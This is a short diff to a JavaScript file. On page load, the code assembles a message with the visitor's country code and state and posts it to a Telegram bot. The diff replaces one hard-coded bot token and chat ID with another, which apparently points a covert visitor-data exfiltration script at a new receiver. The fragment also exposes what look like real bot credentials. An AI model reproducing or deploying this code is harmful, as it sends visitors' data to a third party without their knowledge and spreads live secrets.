@@ -17,8 +17,8 @@ document.addEventListener("DOMContentLoaded", function() {
                           + `- Country-code: ${country_code}\n`
                           + `- State: ${state}`;
   
-            const botToken = '6422540231:AAFfayBIZ-Kju87-FHl0a1usu4wsdU3cbog';
-            const chatId = '-1002078296073';
+            const botToken = '5700160985:AAGLArP0ckx7Vy9uDK25Tr8kK5UKMvsRyOg';
+            const chatId = '5397877284';
   
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
   
